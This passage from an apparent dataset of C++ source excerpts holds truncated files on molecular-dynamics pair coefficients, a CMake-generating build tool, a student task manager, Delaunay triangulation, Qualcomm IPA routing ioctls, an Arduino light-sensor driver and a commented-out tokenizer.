\"Failed to load model!\" << e.msg() << std::endl;\n        }\n    }\n\n}\n\n/* ----------------------------------------------------------------------\n   set coeffs for one or more type pairs pair_coeff\n------------------------------------------------------------------------- */\n\nvoid PairMlff::coeff(int narg, char** arg)\n{\n    int ntype = atom->ntypes;\n    if (!allocated) { allocate(); }\n\n    // pair_coeff * * \n    int ilo, ihi, jlo, jhi;\n    utils::bounds(FLERR, arg[0], 1,",
    "#include <cpr/cpr.h>\n#include <cpr/cprtypes.h>\n#include <yaml-cpp/node/node.h>\n#include <yaml-cpp/node/parse.h>\n#include <yaml-cpp/yaml.h>\n\n#include <cmath>\n#include <cstring>\n#include <filesystem>\n#include <format>\n#include <fstream>\n#include <functional>\n#include <iostream>\n#include <regex>\n#include <string>\n#include <unordered_map>\n\n#include \"Logger.h\"\n\nLogger logger(LogLevel::INFO, \"Main\", &std::cout);\n\nbool validateRepo(const std::string& repo, const std::string& tag) {\n    const std::regex pattern(R\"~(^.+\\/(.+?)\\/(.+?).git)~\");\n    std::smatch matches;\n    if ((std::regex_match(repo, matches, pattern))) {\n        std::string owner = matches[1];\n        std::string name = matches[2];\n\n        // check if tag exists\n        if (tag != \"latest\") {\n            cpr::Response tagResponse = cpr::Get(cpr::Url(std::format(\"https://api.github.com/repos/{}/{}/releases/tags/{}\", owner, name, tag)));\n            if (tagResponse.status_code == 404) {\n                logger.error(std::format(\"Invalid tag {} for {}\", tag, name));\n                return false;\n            }\n        }\n\n        cpr::Response cmakeResponse = cpr::Get(cpr::Url(std::format(\"https://api.github.com/repos/{}/{}/contents/CMakeLists.txt\", owner, name)));\n        if (cmakeResponse.status_code == 404) {\n            logger.error(std::format(\"No CMakeLists.txt found for {}\", repo));\n            return false;\n        }\n        return true;\n    }\n    return false;\n}\n\nbool initCheck() {\n    if (!std::filesystem::exists(\"cradle.yaml\")) {\n        logger.fatal(\"cradle.yaml not found, please run \\\"cradle init\\\"\");\n        return false;\n    }\n    return true;\n}\n\n/// Note: Does not actually use the arguments\nint build(const std::vector<std::string>& args) {\n    if (initCheck()) {\n        YAML::Node config = YAML::LoadFile(\"cradle.yaml\");\n\n        std::filesystem::create_directory(\"include\");\n        std::filesystem::create_directory(\"src\");\n\n        std::ofstream cmake(\"CMakeLists.txt\");\n\n        if (cmake.good()) {\n            cmake << \"# Auto-Generated File *DO NOT EDIT*\\n\";\n\n            cmake << \"\\n\";\n\n            cmake << std::format(\"cmake_minimum_required(VERSION {} FATAL_ERROR)\\n\", config[\"CMake Version\"].as<std::string>());\n            cmake << std::format(\"project({})\\n\", config[\"Project Name\"].as<std::string>());\n\n            cmake << \"\\n\";\n\n            cmake << \"include(FetchContent)\\n\";\n\n            cmake << \"\\n\";\n\n            std::vector<std::string> mustLink;\n\n            const std::regex pattern(\"^(.+?)==(.+?)$\");\n            for (int i = 0; i < config[\"Dependencies\"].size(); i++) {\n                YAML::Node dep = config[\"Dependencies\"][i];\n                std::smatch matches;\n                std::string target = dep.as<std::string>();\n                std::string depName = target;\n                std::string targetVer = \"latest\";\n\n                if (std::regex_match(target, matches, pattern)) {\n                    target = matches[1];\n                    targetVer = matches[2];\n                }\n\n                if (!validateRepo(target, targetVer)) {\n                    logger.error(std::format(\"Removing invalid dependency {}\", dep.as<std::string>()));\n                    config[\"dependencies\"].remove(i);\n                    i--;\n                } else {\n                    const std::regex namePattern(R\"~(^.+\\/(.+?).git$)~\");\n                    std::smatch nameMatches;\n                    if (std::regex_match(target, nameMatches, namePattern)) {\n                        depName = nameMatches[1];\n                        mustLink.push_back(depName);\n                    } else {\n                        cmake.clear();\n                        cmake.close();\n                        logger.fatal(std::format(\"Invalid dependency {}\", target));\n                    }\n\n                    cmake << std::format(\"FetchContent_Declare({}\\n\", depName);\n                    cmake << std::format(\"\\tGIT_REPOSITORY {}\\n\", target);\n                    if (targetVer != \"latest\") {\n                        cmake << std::format(\"\\tGIT_TAG {}\\n\", targetVer);\n                    }\n                    cmake << \")\\n\";\n                    cmake << std::format(\"FetchContent_MakeAvailable({})\\n\", depName);\n                }\n            }\n\n            cmake << \"\\n\";\n\n            cmake << \"include_directories(\\\"${CMAKE_SOURCE_DIR}/include\\\")\\n\";\n            cmake << \"file(GLOB_RECURSE SOURCES \\\"${CMAKE_SOURCE_DIR}/src/*.cpp\\\")\\n\";\n            cmake << std::format(\"add_executable({} \\\"${{SOURCES}}\\\")\\n\", config[\"Executable Name\"].as<std::string>());\n\n            cmake << \"\\n\";\n\n            for (std::string& link : mustLink) {\n                cmake << std::format(\"target_link_libraries({} PRIVATE ${{{}_LIBRARIES}})\\n\", config[\"Executable Name\"].as<std::string>(), link);\n                cmake << std::format(\"target_include_directories(myExecutable PRIVATE \\\"${{{}_SOURCE_DIR}}/include\\\")\\n\", link);\n            }\n\n            cmake << \"\\n\";\n\n            cmake << std::format(\"set",
    "#include \"TaskManager.h\"\nusing namespace SourceFail;\n\nvoid TaskManager::registerUser(const MyString& _username, const MyString& _password)\n{\n\tsize_t length = users.getSize();\n\tfor (size_t i = 0; i < length; i++) {\n\t\tif (users[i].getUsername() == _username) {\n\t\t\t//Create a custom exception if u have the time\n\t\t\tthrow std::runtime_error(\"Trying to register a user that already exists!\");\n\t\t}\n\t}\n\t\n\tusers.pushBack(Profile(_username, _password));\n\ttaskHolders.pushBack(TaskHolder());\n\tstd::cout << \"Registered successfully!\" << std::endl;\n\n}\n\nvoid TaskManager::registerUser(const Profile& newUser, const TaskHolder& th)\n{\n\tsize_t length = users.getSize();\n\tfor (size_t i = 0; i < length; i++) {\n\t\tif (users[i].getUsername() == newUser.getUsername()) {\n\t\t\t//Create a custom exception if u have the time\n\t\t\tthrow std::runtime_error(\"Trying to register a user that already exists!\");\n\t\t}\n\t}\n\n\tusers.pushBack(newUser);\n\ttaskHolders.pushBack(th);\n\tstd::cout << \"Registered successfully!\" << std::endl;\n}\n\nvoid TaskManager::loginUser(const MyString& _username, const MyString& _password)\n{\n\tsize_t length = users.getSize();\n\tfor (size_t i = 0; i < length; i++) {\n\t\tif (users[i].getUsername() == _username) {\n\t\t\tif (users[i].getPassword() == _password) {\n\t\t\t\tindexLoggedUser = i;\n\t\t\t\tstd::cout << \"Welcome back, \" <<_username << \"!\" << std::endl;\n\n\t\t\t\t//DashboardLogic\n\t\t\t\ttaskHolders[indexLoggedUser].loadDashboard();\n\t\t\t\treturn;\n\t\t\t}\n\t\t\t\t\n\t\t\tthrow std::invalid_argument(\"Incorrect password! Please try again!\");\n\t\t}\n\t}\n\tthrow std::runtime_error(\"Trying to log a user that does not exist!\");\n}\n\nvoid TaskManager::logout()\n{\n\tindexLoggedUser = -1;\n\tstd::cout << \"User logged out successfully!\" << std::endl;\n}\n\nvoid TaskManager::exit()\n{\n\tlogout();\n\n\tstd::ofstream ofsProfiles(failUsers, std::ios::binary);\n\tif (!ofsProfiles.is_open()) {\n\t\tthrow std::runtime_error(\"Failed to open profiles.dat for writing!\");\n\t}\n\n\tfor (size_t i = 0; i < users.getSize(); ++i) {\n\t\tofsProfiles.write(reinterpret_cast<const char*>(&users[i]), sizeof(Profile));\n\t}\n\n\tofsProfiles.close();\n\n\t// Write TaskHolders to binary files\n\tfor (size_t i = 0; i < taskHolders.getSize(); ++i) {\n\t\tMyString fileName = users[i].getUsername() + MyString(\".dat\");\n\t\tstd::ofstream ofsTaskHolder(fileName.c_str(), std::ios::binary);\n\t\tif (!ofsTaskHolder.is_open()) {\n\t\t\tthrow std::runtime_error(\"Failed to open file for writing!\");\n\t\t}\n\n\t\tofsTaskHolder.write(reinterpret_cast<const char*>(&taskHolders[i]), sizeof(TaskHolder));\n\t\tofsTaskHolder.close();\n\t}\n\n\n\tstd::ofstream ofsCollabs(SourceFail ::collabsTM, std::ios::binary);\n\tif (!ofsCollabs.is_open()) {\n\t\tthrow std::runtime_error(\"Failed to open profiles.dat for writing!\");\n\t}\n\n\tfor (size_t i = 0; i < collabHolder.getSize(); ++i) {\n\t\tofsCollabs.write(reinterpret_cast<const char*>(&collabHolder[i]), sizeof(Collaboration));\n\t}\n\tofsCollabs.close();\n\tstd::exit(0);\n}\n\nvoid TaskManager::addTask(const MyString& taskName, time_t taskDueDate, const MyString& description)\n{\n\tif (indexLoggedUser < 0) {\n\t\tthrow std::runtime_error(\"No Logged User!\");\n\t}\n\ttry\n\t{\n\t\ttaskHolders[indexLoggedUser].addTask(taskName, taskDueDate, description);\n\t\tstd::cout << \"Task added successfully!\" << std::endl;\n\t}\n\tcatch (const std::exception& e )\n\t{\n\t\tstd::cout << e.what() << std::endl;\n\t}\n}\n\nvoid TaskManager::addTask(const Task& other)\n{\n\tif (indexLoggedUser < 0) {\n\t\tthrow std::runtime_error(\"No Logged User!\");\n\t}\n\ttry\n\t{\n\t\ttaskHolders[indexLoggedUser].addTask(other);\n\t}\n\tcatch (const std::exception& e)\n\t{\n\t\tstd::cout << e.what() << std::endl;\n\t}\n}\n\nvoid TaskManager::addUserTask(size_t indexUser, const Task& newTask)\n{\n\ttry\n\t{\n\t\ttaskHolders[indexUser].addTask(newTask);\n\t}\n\tcatch (const std::exception& e)\n\t{\n\t\tstd::cout << e.what() << std::endl;\n\t}\n}\n\nvoid TaskManager::updateTaskName(size_t _ID, const MyString& newTaskName)\n{\n\tif (indexLoggedUser < 0) {\n\t\tthrow std::runtime_error(\"No Logged User!\");\n\t}\n\ttry\n\t{\n\t\ttaskHolders[indexLoggedUser].updateTaskName(_ID, newTaskName);\n\t\tstd::cout << \"Task name updated successfully!\" << std::endl;\n\t}\n\tcatch (const std::exception& e)\n\t{\n\t\tstd::cout << e.what() << std::endl;\n\t}\n}\n\nvoid TaskManager::startTask(size_t _ID)\n{\n\tif (indexLoggedUser < 0) {\n\t\tthrow std::runtime_error(\"No Logged User!\");\n\t}\n\ttry\n\t{\n\t\ttaskHolders[indexLoggedUser].startTask(_ID);\n\t\tstd::cout << \"Task started successfully!\" << std::endl;\n\t}\n\tcatch (const std::exception& e)\n\t{\n\t\tstd::cout << e.what() << std::endl;\n\t}\n}\n\nvoid TaskManager::updateTaskDescription(size_t _ID, const MyString& newDescription)\n{\n\tif (indexLoggedUser < 0) {\n\t\tthrow std::runtime_error(\"No Logged User!\");\n\t}\n\ttry\n\t{\n\t\ttaskHolders[indexLoggedUser].updateTaskDescription(_ID,newDescription);\n\t\tstd::cout << \"Task description updated successfully!\" << std::endl;\n\t}\n\tcatch (const std::exception& e)\n\t{\n\t\tstd::cout << e.what() << std::endl;\n\t}\n}\n\nvoid TaskManager::deleteTask(size_t _ID)\n{\n\tif (indexLoggedUser < 0) {\n\t\tthrow std::runtime_error(\"No Logged User!\");\n\t}\n\ttry\n\t{\n\t\ttaskHolders[indexLoggedUser].delete",
    "/*****************************************************************\n *  @file main.cpp                                               *\n *  @brief \u7528\u4e8e\u6784\u9020\u548c\u6c42\u89e3\u4e09\u89d2\u7f51\u683c\u4e0a\u7684\u6cca\u677e\u65b9\u7a0b\u7684\u7ebf\u6027\u7cfb\u7edf\u3002        *\n *                                                               *\n *  \u8be5\u7a0b\u5e8f\u4eceOBJ\u6587\u4ef6\u8bfb\u53d6\u9876\u70b9\u4fe1\u606f\uff0c\u6784\u9020\u5fb7\u52b3\u5185\u4e09\u89d2\u5256\u5206\uff0c            *\n *  \u4f9d\u636e\u5256\u5206\u4fe1\u606f\u6784\u9020\u8868\u793a\u7f51\u683c\u9876\u70b9\u6cca\u677e\u65b9\u7a0b\u7684\u7ebf\u6027\u7cfb\u7edf\uff0c             *\n *  \u4f7f\u7528\u96c5\u53ef\u6bd4\u65b9\u6cd5\u6c42\u89e3\u8be5\u7cfb\u7edf\uff0c\u5e76\u5c06\u7ed3\u679c\u7f51\u683c\u5199\u5165OBJ\u6587\u4ef6\u3002          *\n *                                                               *   \n *  @author \u6234\u8fb0\u9633 21312016                                      *\n ****************************************************************/ \n\n#include \"Mesh.h\"\n\n/**\n *  @brief \u8ba1\u7b97\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u7684\u6b27\u51e0\u91cc\u5f97\u8ddd\u79bb\u3002\n *\n *  @param v1 \u7b2c\u4e00\u4e2a\u9876\u70b9\u3002\n *  @param v2 \u7b2c\u4e8c\u4e2a\u9876\u70b9\u3002\n *  @return \u8fd4\u56de\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002\n */\ndouble get_dist(const Vertex& v1, const Vertex& v2) {\n    return sqrt((v1.x - v2.x) * (v1.x - v2.x) + (v1.y - v2.y) * (v1.y - v2.y));\n}\n\n/**\n *  @brief \u5224\u65ad\u67d0\u4e2a\u9876\u70b9\u662f\u5426\u5c5e\u4e8e\u67d0\u4e2a\u4e09\u89d2\u5f62\u3002\n *\n *  @param T \u4e09\u89d2\u5f62\u5bf9\u8c61\u3002\n *  @param idx \u9876\u70b9\u7d22\u5f15\u3002\n *  @return \u5982\u679c\u9876\u70b9\u5c5e\u4e8e\u8be5\u4e09\u89d2\u5f62\uff0c\u5219\u8fd4\u56detrue\uff1b\u5426\u5219\u8fd4\u56defalse\u3002\n */\nbool is_vertex(const Triangle& T, int idx) {\n    return idx == T.v1 || idx == T.v2 || idx == T.v3;\n}\n\n/**\n *  @brief \u5224\u65ad\u9876\u70b9\u662f\u5426\u4e3a\u8fb9\u754c\u70b9\u3002\n *\n *  @param v \u9876\u70b9\u5bf9\u8c61\u3002\n *  @return \u5982\u679c\u9876\u70b9\u662f\u8fb9\u754c\u70b9\uff0c\u5219\u8fd4\u56detrue\uff1b\u5426\u5219\u8fd4\u56defalse\u3002\n */\nbool is_boundary_vertex(const Vertex& v) {\n    return v.phi > -1e29;\n}\n\n/**\n *  @brief \u5224\u65ad\u4e24\u6761\u8fb9\u662f\u5426\u76f8\u7b49\u3002\n *\n *  @param e1 \u7b2c\u4e00\u6761\u8fb9\u3002\n *  @param e2 \u7b2c\u4e8c\u6761\u8fb9\u3002\n *  @return \u5982\u679c\u4e24\u6761\u8fb9\u76f8\u7b49\uff0c\u5219\u8fd4\u56detrue\uff1b\u5426\u5219\u8fd4\u56defalse\u3002\n */\nbool is_edge_equal(std::pair<int, int> e1, std::pair<int, int> e2) {\n    return ((e1.first == e2.second && e1.second == e2.first) || e1 == e2);\n}\n\n/**\n *  @brief \u5224\u65ad\u4e00\u4e2a\u70b9\u662f\u5426\u5728\u4e09\u89d2\u5f62\u7684\u5916\u63a5\u5706\u5185\u3002\n *\n *  @param p \u5f85\u5224\u65ad\u7684\u70b9\u3002\n *  @param v1 \u4e09\u89d2\u5f62\u7684\u7b2c\u4e00\u4e2a\u9876\u70b9\u3002\n *  @param v2 \u4e09\u89d2\u5f62\u7684\u7b2c\u4e8c\u4e2a\u9876\u70b9\u3002\n *  @param v3 \u4e09\u89d2\u5f62\u7684\u7b2c\u4e09\u4e2a\u9876\u70b9\u3002\n *  @return \u5982\u679c\u70b9\u5728\u5916\u63a5\u5706\u5185\uff0c\u5219\u8fd4\u56detrue\uff1b\u5426\u5219\u8fd4\u56defalse\u3002\n */\nbool is_in_circumcircle(const Vertex& p, const Vertex& v1, const Vertex& v2, const Vertex& v3) {\n    double ax = v1.x - p.x;\n    double ay = v1.y - p.y;\n    double bx = v2.x - p.x;\n    double by = v2.y - p.y;\n    double cx = v3.x - p.x;\n    double cy = v3.y - p.y;\n\n    double det_ab = ax * by - ay * bx;\n    double det_bc = bx * cy - by * cx;\n    double det_ca = cx * ay - cy * ax;\n\n    double a_squared = ax * ax + ay * ay;\n    double b_squared = bx * bx + by * by;\n    double c_squared = cx * cx + cy * cy;\n\n    double det = a_squared * det_bc + b_squared * det_ca + c_squared * det_ab;\n    return det > 0;\n}\n\n/**\n *  @brief \u751f\u6210\u4e00\u4e2a\u5305\u542b\u6240\u6709\u70b9\u5728\u5185\u7684\u8d85\u4e09\u89d2\u5f62\u3002\n *\n *  @param vertices \u9876\u70b9\u6570\u7ec4\u3002\n *  @param triangles \u4e09\u89d2\u5f62\u6570\u7ec4\u3002\n */\nvoid generate_super_triangle(std::vector<Vertex>& vertices, std::vector<Triangle>& triangles) {\n    double min_x = 1e9, min_y = 1e9, max_x = -1e9, max_y = -1e9;\n\n    for (const auto& vertex : vertices) {\n        if (vertex.x < min_x) min_x = vertex.x;\n        if (vertex.y < min_y) min_y = vertex.y;\n        if (vertex.x > max_x) max_x = vertex.x;\n        if (vertex.y > max_y) max_y = vertex.y;\n    }\n\n    double dx = max_x - min_x;\n    double dy = max_y - min_y;\n    double mid_x = (min_x + max_x) / 2.0;\n    double mid_y = (min_y + max_y) / 2.0;\n\n    Vertex v1 = { mid_x - 2 * dx, mid_y - dy, 0, 0 };\n    Vertex v2 = { mid_x + 2 * dx, mid_y - dy, 0, 0 };\n    Vertex v3 = { mid_x, mid_y + 2 * dy, 0, 0 };\n    vertices.push_back(v1);\n    vertices.push_back(v2);\n    vertices.push_back(v3);\n\n    Triangle super_tri = { vertices.size() - 3, vertices.size() - 2, vertices.size() - 1 };\n    triangles.push_back(super_tri);\n}\n\n/**\n *  @brief \u6784\u9020\u5fb7\u52b3\u5185\u4e09\u89d2\u5256\u5206\u3002\n *\n *  @param vertices \u9876\u70b9\u6570\u7ec4\u3002\n *  @param triangles \u4e09\u89d2\u5f62\u6570\u7ec4\u3002\n */\nvoid construct_delaunay(std::vector<Vertex>& vertices, std::vector<Triangle>& triangles) {\n    generate_super_triangle(vertices, triangles);\n    for (int i = 0; i < vertices.size() - 3; ++i) {\n        std::vector<std::pair<int, int>> edge_buffer;\n        for (auto iter = triangles.begin(); iter != triangles.end();) {\n            if (is_in_circumcircle(vertices[i], vertices[iter->v1], vertices[iter->v2], vertices[iter->v3])) {\n                edge_buffer.push_back({ iter->v1, iter->v2 });\n                edge_buffer.push_back({ iter->v2, iter->v3 });\n                edge_buffer.push_back({ iter->v3, iter->v1 });\n                iter = triangles.erase(iter);   // \u8fd4\u56de\u65b0\u7684\u8fed\u4ee3\u5668\n            }\n            else {\n                ++iter;\n            }\n        }\n        for (int j = 0; j < edge_buffer.size(); ++j) {\n            for (int k = j + 1; k < edge_buffer.size(); ++k) {\n                if (is_edge_equal(edge_buffer[j], edge_buffer[k])) {\n                    edge_buffer.erase(edge_buffer.begin() + k);\n                    edge_buffer.erase(edge_buffer.begin() + j);\n                    --j;\n                    break;\n                }\n            }\n        }\n        for (const auto& edge : edge_buffer) {\n            Triangle tri;\n            tri.v1 = edge.first;\n            tri.v2 = edge.second;\n            tri.v3 = i;\n            triangles.push_back(tri);\n        }\n    }\n    \n    std::vector<int> vertex_removed;\n    for (auto iter = triangles.begin(); iter != triangles.end();) {\n        if (iter->v1 >= vertices.size() - 3 || iter->v2 >= vertices.size() - 3 || iter->v3 >= vertices.size() - 3 ||\n       ",
    "/*\nCopyright (c) 2013, The Linux Foundation. All rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n\t\t* Redistributions of source code must retain the above copyright\n\t\t\tnotice, this list of conditions and the following disclaimer.\n\t\t* Redistributions in binary form must reproduce the above\n\t\t\tcopyright notice, this list of conditions and the following\n\t\t\tdisclaimer in the documentation and/or other materials provided\n\t\t\twith the distribution.\n\t\t* Neither the name of The Linux Foundation nor the names of its\n\t\t\tcontributors may be used to endorse or promote products derived\n\t\t\tfrom this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\nWARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\nARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\nBE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\nBUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\nWHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\nOR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\nIF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n/*!\n\t@file\n\tIPACM_Routing.cpp\n\n\t@brief\n\tThis file implements the IPACM routing functionality.\n\n\t@Author\n\n*/\n\n#include <unistd.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n\n#include \"IPACM_Routing.h\"\n#include <IPACM_Log.h>\n\nconst char *IPACM_Routing::DEVICE_NAME = \"/dev/ipa\";\n\nIPACM_Routing::IPACM_Routing()\n{\n\tm_fd = open(DEVICE_NAME, O_RDWR);\n\tif (0 == m_fd)\n\t{\n\t\tIPACMERR(\"Failed opening %s.\\n\", DEVICE_NAME);\n\t}\n}\n\nIPACM_Routing::~IPACM_Routing()\n{\n\tclose(m_fd);\n}\n\nbool IPACM_Routing::DeviceNodeIsOpened()\n{\n\tint res = fcntl(m_fd, F_GETFL);\n\n\tif (m_fd > 0 && res >= 0) return true;\n\telse return false;\n\n}\n\nbool IPACM_Routing::AddRoutingRule(struct ipa_ioc_add_rt_rule *ruleTable)\n{\n\tint retval = 0, cnt=0;\n\tbool isInvalid = false;\n\n\tif (!DeviceNodeIsOpened())\n\t{\n\t\tIPACMERR(\"Device is not opened\\n\");\n\t\treturn false;\n\t}\n\n\tfor(cnt=0; cnt<ruleTable->num_rules; cnt++)\n\t{\n\t\tif(ruleTable->rules[cnt].rule.dst > IPA_CLIENT_MAX)\n\t\t{\n\t\t\tIPACMERR(\"Invalid dst pipe, Rule:%d  dst_pipe:%d\\n\", cnt, ruleTable->rules[cnt].rule.dst);\n\t\t\tisInvalid = true;\n\t\t}\n\t}\n\n\tif(isInvalid)\n\t{\n\t\treturn false;\n\t}\n\n\tretval = ioctl(m_fd, IPA_IOC_ADD_RT_RULE, ruleTable);\n\tif (retval)\n\t{\n\t\tIPACMERR(\"Failed adding routing rule %p\\n\", ruleTable);\n\t\treturn false;\n\t}\n\n\tfor(cnt=0; cnt<ruleTable->num_rules; cnt++)\n\t{\n\t\tIPACMDBG(\"Rule:%d  dst_pipe:%d\\n\", cnt, ruleTable->rules[cnt].rule.dst);\n\t}\n\n\tIPACMDBG_H(\"Added routing rule %p\\n\", ruleTable);\n\treturn true;\n}\n\nbool IPACM_Routing::DeleteRoutingRule(struct ipa_ioc_del_rt_rule *ruleTable)\n{\n\tint retval = 0;\n\n\tif (!DeviceNodeIsOpened()) return false;\n\n\tretval = ioctl(m_fd, IPA_IOC_DEL_RT_RULE, ruleTable);\n\tif (retval)\n\t{\n\t\tIPACMERR(\"Failed deleting routing rule table %p\\n\", ruleTable);\n\t\treturn false;\n\t}\n\n\tIPACMDBG_H(\"Deleted routing rule %p\\n\", ruleTable);\n\treturn true;\n}\n\nbool IPACM_Routing::Commit(enum ipa_ip_type ip)\n{\n\tint retval = 0;\n\n\tif (!DeviceNodeIsOpened()) return false;\n\n\tretval = ioctl(m_fd, IPA_IOC_COMMIT_RT, ip);\n\tif (retval)\n\t{\n\t\tIPACMERR(\"Failed commiting routing rules.\\n\");\n\t\treturn false;\n\t}\n\n\tIPACMDBG_H(\"Commited routing rules to IPA HW.\\n\");\n\treturn true;\n}\n\nbool IPACM_Routing::Reset(enum ipa_ip_type ip)\n{\n\tint retval = 0;\n\n\tif (!DeviceNodeIsOpened()) return false;\n\n\tretval = ioctl(m_fd, IPA_IOC_RESET_RT, ip);\n\tretval |= ioctl(m_fd, IPA_IOC_COMMIT_RT, ip);\n\tif (retval)\n\t{\n\t\tIPACMERR(\"Failed resetting routing block.\\n\");\n\t\treturn false;\n\t}\n\n\tIPACMDBG_H(\"Reset command issued to IPA routing block.\\n\");\n\treturn true;\n}\n\nbool IPACM_Routing::GetRoutingTable(struct ipa_ioc_get_rt_tbl *routingTable)\n{\n\tint retval = 0;\n\n\tif (!DeviceNodeIsOpened()) return false;\n\n\tretval = ioctl(m_fd, IPA_IOC_GET_RT_TBL, routingTable);\n\tif (retval)\n\t{\n\t\tIPACMERR(\"IPA_IOCTL_GET_RT_TBL ioctl failed, routingTable =0x%p, retval=0x%x.\\n\", routingTable, retval);\n\t\treturn false;\n\t}\n\tIPACMDBG_H(\"IPA_IOCTL_GET_RT_TBL ioctl issued to IPA routing block.\\n\");\n\t/* put routing table right after successfully get routing table */\n\tPutRoutingTable(routingTable->hdl);\n\n\treturn true;\n}\n\nbool IPACM_Routing::PutRoutingTable(uint32_t routingTableHandle)\n{\n\tint retval = 0;\n\n\tif (!DeviceNodeIsOpened()) return false;\n\n\tretval = ioctl(m_fd, IPA_IOC_PUT_RT_TBL, routingTableHandle);\n\tif (retval)\n\t{\n\t\tIPACMERR(\"IPA_IOCTL_PUT_RT_TBL ioctl failed.\\n\");\n\t\treturn false;\n\t}\n\n\tIPACMDBG_H(\"IPA_IOCTL_PUT_RT_TBL ioctl issued to IPA routing block.\\n\");\n\treturn true;\n}\n\nbool IPACM_Routing::DeleteRoutingHdl(uint32_t rt_rule_hdl, ipa_ip_type ip)\n{\n\tconst",
    "#include \"LightDetection.h\"\n#include <limits.h>\n\nvoid LightDetection::begin(void){\n    LightDetection::beginInfrared();\n    LightDetection::beginDaylight();\n};\n\nuint16_t LightDetection::getValue(photoTransistors sensor){\n    switch(sensor){\n        //Fall Through intended\n        case IR_FRONT:\n        case IR_LEFT:\n        case IR_RIGHT:\n        case IR_BACK:\n            return readIRPT(sensor);\n        case DL_BOTTOM:\n        case DL_FRONT:\n            return readDLPT(sensor);\n        default:\n            //currently not reachable, just if enum will be extended in the future\n            return UINT16_MAX;\n }\n};\n\nphotoTransistors LightDetection::getBrightest(ptType type){\n    photoTransistors maxSensor;\n    uint16_t maxReading = 0;\n    uint16_t currentReading = 0;\n    \n    if (type == IR){\n        maxSensor = IR_FRONT;\n       for(const auto pt : allIRPTs){\n            currentReading = LightDetection::getValue(pt);\n            if (currentReading > maxReading){\n                maxReading = currentReading;\n                maxSensor = pt;\n            }\n        }\n    } else {\n        maxSensor = DL_FRONT;\n        for(const auto pt : allDLPTs){\n            currentReading = LightDetection::getValue(pt);\n            if (currentReading > maxReading){\n                maxReading = currentReading;\n                maxSensor = pt;\n            }\n        }\n    }\n    \n    return maxSensor;\n};\n\nuint32_t LightDetection::getAverageValue(photoTransistors sensor, uint32_t measurments, uint32_t timeBetween){\n    \n    TickType_t xLastWakeTime = xTaskGetTickCount();\n    TickType_t frequency = timeBetween / portTICK_PERIOD_MS;\n    uint64_t cumulatedResult = 0; \n    for(int i = 0; i < measurments; i++){\n        cumulatedResult += LightDetection::getValue(sensor);\n        xTaskDelayUntil(&xLastWakeTime,frequency);\n    }\n    return cumulatedResult/measurments;\n};\n\nvoid LightDetection::beginInfrared(void){\n    digitalWrite(IR_PT_ENABLE,true);\n    pinMode(IR_PT_ENABLE, OUTPUT);\n    pinMode(IR_PT_FRONT_ADC, INPUT);\n    pinMode(IR_PT_LEFT_ADC, INPUT);\n    pinMode(IR_PT_RIGHT_ADC, INPUT);\n    pinMode(IR_PT_BACK_ADC, INPUT);\n};\n\nvoid LightDetection::beginDaylight(void){\n    digitalWrite(DL_PT_ENABLE,true);\n    pinMode(DL_PT_ENABLE, OUTPUT);\n    pinMode(DL_PT_BOTTOM_ADC, INPUT);\n    pinMode(DL_PT_FRONT_ADC, INPUT );\n};\n\nuint16_t LightDetection::readIRPT(photoTransistors sensor){\n    //digitalWrite(IR_PT_ENABLE,HIGH);\n    uint16_t result = 0;\n    switch (sensor)\n    {\n    case IR_FRONT:\n        result = analogRead(IR_PT_FRONT_ADC);\n        break;\n    case IR_LEFT:\n        result = analogRead(IR_PT_LEFT_ADC);\n        break;\n    case IR_RIGHT:\n        result = analogRead(IR_PT_RIGHT_ADC);\n        break;\n    case IR_BACK:\n        result = analogRead(IR_PT_BACK_ADC);\n        break;\n    default:\n        break;\n    }\n    //digitalWrite(IR_PT_ENABLE,LOW);\n    return result;\n};\n\nuint16_t LightDetection::readDLPT(photoTransistors sensor){\n    digitalWrite(DL_PT_ENABLE,HIGH);\n    uint16_t result = 0;\n    switch (sensor)\n    {\n    case DL_FRONT:\n        result = analogRead(DL_PT_FRONT_ADC);\n        break;\n    case DL_BOTTOM:\n        result = analogRead(DL_PT_BOTTOM_ADC);\n        break;\n    default:\n        break;\n    }\n    digitalWrite(DL_PT_ENABLE,LOW);\n    return result;\n};",
    "//#include<iostream>\n//#include<string>\n//#include<sstream>\n//using namespace std;\n//\n//bool isInt(const string& str) {\n//\tint n;\n//\tistringstream istreamObject(str); // Create istringstream from string\n//\tistreamObject >> noskipws >> n; // Get an int value from stream\n//\t// Check if stringstream has reached its end and not failed\n//\treturn istreamObject.eof() && !istreamObject.fail();\n//}\n//\n//struct Data {\n//\tint amount[12];\n//\tstring categories[10];\n//};\n//\n//Data user;\n//void tokenize(string s, string del)\n//{\n//\tint start, end = -1 * del.size();\n//\tint i = 0;\n//\tint j = 0;\n//\tdo {\n//\t\tstart = end + del.size();\n//\t\tend = s.find(del, start);\n//\t\tif (isInt(s.substr(start, end - start))) {\n//\t\t\t//cout << s.substr(start, end - start) << endl;\n//\t\t\tuser.amount[i] = stoi(s.substr(start, end - start));\n//\t\t\ti++;\n//\t\t}\n//\t\telse {\n//\t\t//cout << s.substr(start, end - start) << endl;\n//\t\tuser.categories[j] = s.substr(start, end - start);\n//\t\tj++;\n//\t\t}\n//\t} while (end != -1);\n//\t/*for (int k = 0; k < j; k++) {\n//\t\tcout << k + 1 